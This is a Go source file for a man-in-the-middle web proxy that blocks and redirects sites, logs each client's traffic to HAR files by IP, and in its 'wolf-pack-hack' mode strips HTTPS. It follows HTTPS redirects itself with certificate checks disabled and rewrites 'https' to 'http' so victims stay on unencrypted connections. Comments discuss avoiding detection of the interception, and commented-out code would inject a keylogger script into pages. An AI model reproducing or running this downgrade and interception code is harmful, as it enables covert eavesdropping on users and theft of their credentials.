package controllers

import (
    // "github.com/elazarl/goproxy"
    "github.com/abourget/goproxy"
    // "github.com/abourget/goproxy/ext/image"
    // "image"
    // "image/jpeg"
    "log"
    "net"
    "net/http"
    "strings"
    "bytes"
    // "os"
    // "io"
    "io/ioutil"
    "crypto/tls"
    "time"
)


// -----------------------------------------------------------------------------------------


const (
    CONN_HOST = "localhost"
    CONN_PORT = "8080"
    CONN_TYPE = "tcp"
)

// var listOfUsers map[string]struct{}
var listener net.Listener
// var proxy *goproxy.ProxyHttpServer

// Provide booleans for each function
var globalStoreHAR bool
var globalRedirects bool
var globalBlocks bool
var globalWolfPack bool


// -----------------------------------------------------------------------------------------


func StartSimpleProxy() net.Listener {

    // Provide booleans for each function
    globalStoreHAR = false

    log.Println(" >>> STARTING PROXY SERVER")
    log.Println("     --- OPTION storing HAR ", globalStoreHAR)
    log.Println("     --- OPTION redirection ", globalRedirects)
    log.Println("     --- OPTION blocking ", globalBlocks)
    log.Println("     --- OPTION wolf-pack-hack ", globalWolfPack)
    
    // Start the listener to listen on the connection.
    listener, _ = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
    // Start the proxy.
    proxy := goproxy.NewProxyHttpServer()

    // What does this do?
    proxy.Verbose = false

    // Check if we are BLOCKING this page.
    if globalBlocks {
        pageBlock := TriggerBlock()
        proxy.HandleRequest(goproxy.RequestHostContains(banned...)(pageBlock))
    } // end of blocks.

    // Check if we are REDIRECTING away from this page.
    if globalRedirects {
        pageRedirect := TriggerRedirect()
        proxy.HandleRequest( goproxy.RequestHostContains(redirect...)(pageRedirect) )
    } // end of redirect.

    if globalWolfPack {
        // Catch HSTS and direct https:// (i.e it immediately puts an SNI header in place)
        proxy.HandleConnectFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
            // Potentially best to REJECT so that MITM is not detected. detection of MITM could cause suspicion
            if ctx.SNIHost() != "" {
                log.Println(" *** HTTPS Connection: ", ctx.SNIHost())
                //return goproxy.MITM // This is failing...
                return goproxy.FORWARD
            }
            return goproxy.FORWARD
        })
    }





    // Handle the CLIENT-REQUEST.
    proxy.HandleRequestFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
        if globalStoreHAR {
            log.Println(" --- CLIENT REQUEST: logging HAR to "+ctx.Host()+".har")
            ctx.LogToHARFile(true)
            t := time.Now().Local()
            timestamp := t.Format("20060102150405")
            proxy.FlushHARToDisk(fileLocation+"/hars/req_"+strings.Split(ctx.Req.RemoteAddr, ":")[0]+"_"+ctx.Host()+"_"+timestamp+".har")
        } else {
            log.Println(" --- CLIENT REQUEST: NOT logging HAR for "+ctx.Host() )
        }
        // Check if this is HTTPS connection via MITM.
        if ctx.IsThroughMITM {
            ctx.Req.Host = ctx.Host()
            log.Println(" $$$ MITM: Connection is over HTTPS")
            return goproxy.FORWARD // don't follow through other Request Handlers
        }
        // addUser(ctx.Req.RemoteAddr)
        return goproxy.NEXT
    })

    // Wolf pack hack.
    // We want to make sure that if a page redirects to https using a 301 or 302 we mitm that connection.
    // Handle the SERVER-RESPONSE
    if globalWolfPack {
        interceptResponse := TriggerWolfPack()
        proxy.HandleResponse((interceptResponse))
    } else {
        proxy.HandleResponseFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
            if globalStoreHAR {
                log.Println(" --- SERVER RESPONSE: logging to "+ctx.Host()+".har")
                ctx.LogToHARFile(true)
                t := time.Now().Local()
                timestamp := t.Format("20060102150405")
                proxy.FlushHARToDisk(fileLocation+"/hars/res_"+strings.Split(ctx.Req.RemoteAddr, ":")[0]+"_"+ctx.Host()+"_"+timestamp+".har")
            } else {
                log.Println(" --- SERVER REQUEST: NOT logging HAR for "+ctx.Host() )
            }
            return goproxy.NEXT
        })
    }

    go http.Serve(listener, proxy)
    
    return listener
}


//
func TriggerRedirect() goproxy.HandlerFunc {
    // Create a new pageRedirect handler function to pass back later on.
    pageRedirect := goproxy.HandlerFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
        // Get the body for the redirect url.
        body := utilsGetBuffer(strings.Split(ctx.Req.URL.Host, ".")[1]) //get the middle of the url: www.url.com...
        //body = utilsInjector(body, "</body>", "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/keylogger.js\"></script></body>")
        // Set the response-headers before responding.
        client_response := utilsGetHTTPHeaders(body,"text/html")
        ctx.Resp = client_response
        ctx.DispatchResponseHandlers()
        return goproxy.DONE
    })
    return pageRedirect
}


//
func TriggerBlock() goproxy.HandlerFunc {
    // Create a new pageBlocker handler function to pass back later on.
    pageBlocker := goproxy.HandlerFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
        // Create the body, very naieve for now.
        body := "<html><body><h1>This site is blocked</h1></body></html>"
        // Set the response-headers before responding.
        client_response := utilsGetHTTPHeaders(body,"text/html")
        ctx.Resp = client_response
        ctx.DispatchResponseHandlers()
        return goproxy.DONE
    })
    return pageBlocker
}


func TriggerWolfPack() goproxy.HandlerFunc {
    //
    interceptResponse := goproxy.HandlerFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
        
        // Check if the SERVER-RESPOSE is actually giving us a 301/302 redirection.
        if ctx.Resp != nil && (strings.Contains(ctx.Resp.Status, "301") || strings.Contains(ctx.Resp.Status, "302")) {
            
            // Check if we are directed to an HTTPS page
            // Then we kill the original request, and make the connection ourself
            if strings.Contains(ctx.Resp.Header.Get("Location"), "https") {

                log.Println(" *** ---->>> CLIENT Requested URL (redirecting): ", ctx.Resp.Request.URL)
                log.Println(" *** <<<---- SERVER Response 301 to location: ", ctx.Resp.Header.Get("Location"))

                ctx.Resp.Request.URL.Scheme = "http"
                ctx.Resp.Header.Set("Location", strings.Replace(ctx.Resp.Header.Get("Location"), "https", "http", -1))
                ctx.Resp.Request.URL.Host = strings.Replace(ctx.Host(), "https", "http", -1)

                tr := &http.Transport{
                    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                }
                client := &http.Client{Transport: tr}
                server_ssl_response, err := client.Get( ctx.Resp.Header.Get("Location") )
                if err != nil {
                    log.Println(" help!: ", err)
                }
                log.Println(" TLS for: ", server_ssl_response.Header.Get("Location"))

                log.Println(server_ssl_response.TLS)
                bs, err := ioutil.ReadAll(server_ssl_response.Body)
                if err != nil {
                    log.Println(err)
                }
                body := string(bs)
                body = strings.Replace(body, "https", "http", -1)
                // Create a response object from the body.
                client_response := utilsGetHTTPHeaders(body,server_ssl_response.Header.Get("Content-Type"))
                ctx.Resp = client_response
                return goproxy.FORWARD

            } else { // if ctx.Resp.Header.Get("Location")[0:5] == "http:" {
                // Redirecting to some HTTP page.
                log.Println("Response is HTTP")
                bs, err := ioutil.ReadAll(ctx.Resp.Body)
                if err != nil {
                    log.Println(err)
                }
                body := string(bs)
                // strip all https out of the page so that a redirect will be required if necessary
                body = strings.Replace(body, "https", "http", -1)
                ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
                return goproxy.NEXT
            }

        } // end of 301-302 redirects.


        // log.Println("neither of the above, we are forwarding data")
        // if strings.Contains(ctx.Resp.Request.URL.Path, "js") { 
        //     //catch javascript files to embed the hook into
        //     log.Println("HTTP URL: ", ctx.Resp.Request.URL.Path)
        // } else if strings.Contains(ctx.Resp.Request.URL.Path, "css") { 
        //     //catch css and leave it alone
        // } else { //must be an html file or a picture or whatever.
        //     bs, err := ioutil.ReadAll(ctx.Resp.Body)
        //     if err != nil {
        //         log.Println(err)
        //     }
        //     body := string(bs)
        //     body = strings.Replace(body, "https", "http", -1) //stip all https tags
        //     //need to inject javascript aswell
        //     ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
        // }

        return goproxy.NEXT
    }) // end of the proxy OnResponse.
    return interceptResponse
}



// -----------------------------------------------------------------------------------------










// //ERROR: issue is it doesnt recognise the image type
// func ReplaceImages() net.Listener {
//     listener, _ = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
//     image.RegisterFormat("jpeg", "jpeg", jpeg.Decode, jpeg.DecodeConfig)
//     log.Println("Replacing images")
//     decoded, _ := os.Open(fileLocation+"/decoded.jpg")
//     defer decoded.Close()
//     proxy := goproxy.NewProxyHttpServer()

//     proxy.Verbose = false
//     go http.Serve(listener, proxy) // you can probably ignore this error
//     return listener
// }






// //ERROR: want to inject code, but crashes out at the moment
// func InjectScript(replace string, result string) net.Listener {
//     listener, _ = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
//     proxy := goproxy.NewProxyHttpServer()
//     log.Println("replace: ", replace)
//     log.Println("result: ", result)
//     //inject jquery always...
//     // result = "<script src=\"http://127.0.0.1:9000/public/js/jquery-1.9.1.min.js\"></script>"+result
//     interceptResponse := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {

//         // proxy.OnResponse().DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {

//         // log.Println("URL: ", ctx.Resp.Request.URL)
//             // log.Println("page: ", ctx.Req.URL.Path)
//             // if strings.Contains(ctx.Req.URL.Path, "/") {
//                 log.Println("found: ", ctx.Req.URL.Path)
//                 //start reading the response for editing
//                 bs, err := ioutil.ReadAll(ctx.Resp.Body)
//                 if err != nil {
//                    log.Println("inject error: ", err)
//                 }
//                 body := string(bs) //needs to be a string for reading
//                 body = injector(body, replace, result)

//                 ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
//             // }

//             return goproxy.NEXT
//         })
//     proxy.HandleResponse(interceptResponse)
//     go http.Serve(listener, proxy) // you can probably ignore this error
//     return listener
// }

// func injector(body string, replace string, result string) string {
//     body = strings.Replace(body, replace, result, -1)
//     // log.Println("injected: ", body)
//     return body
// }

// func FlipImages() net.Listener {
//     listener, _ = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
//     proxy := goproxy.NewProxyHttpServer()
//     interceptResponse := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
//         log.Println("URL: ", ctx.Resp.Request.URL)
//         log.Println("interceptor")
//         goproxy_image.HandleImage(func(img image.Image, ctx *goproxy.ProxyCtx) image.Image {
//             dx, dy := img.Bounds().Dx(), img.Bounds().Dy()
//             log.Println("image")
//             nimg := image.NewRGBA(img.Bounds())
//             for i := 0; i < dx; i++ {
//                 for j := 0; j <= dy; j++ {
//                     nimg.Set(i, j, img.At(i, dy-j-1))
//                 }
//             }
//             return nimg
//         })
//         return goproxy.DONE
//     })
//     proxy.HandleResponse(interceptResponse)
//     go http.Serve(listener, proxy) // you can probably ignore this error
//     return listener
// }

